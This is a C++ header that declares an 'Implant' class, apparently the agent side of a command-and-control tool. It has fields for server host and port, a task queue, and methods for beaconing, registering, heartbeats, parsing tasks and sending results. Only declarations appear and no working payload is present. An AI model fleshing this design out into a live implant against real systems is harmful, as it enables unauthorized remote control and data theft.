#pragma once

#include <iostream>
#include <string>
#include <optional>
#include <vector>
#include <mutex>
#include <future>
#include <random>
#include <nlohmann/json.hpp>

#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <asio.hpp>
#include <queue>

#include "tasks.h"

using json = nlohmann::json;

class Implant {
private:
    const std::string host, port;
    std::string id;
    bool isRunning;

    asio::io_context context;

    std::queue<std::string> taskQueue;
    std::mutex taskMutex, resultsMutex;

    void parseTasks(const std::string& response);
    void heartbeat(asio::ip::tcp::socket& socket);
	[[nodiscard]] std::string sendResults();

public:
    Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning = false);
    ~Implant();

    void beacon();
    void registerAgent(asio::ip::tcp::socket& socket);
    void addQueue(std::string msg);
    void setRunning(bool isRunning);
    void setHeartbeat(bool beating);
    void setId(std::string& implantId);
};


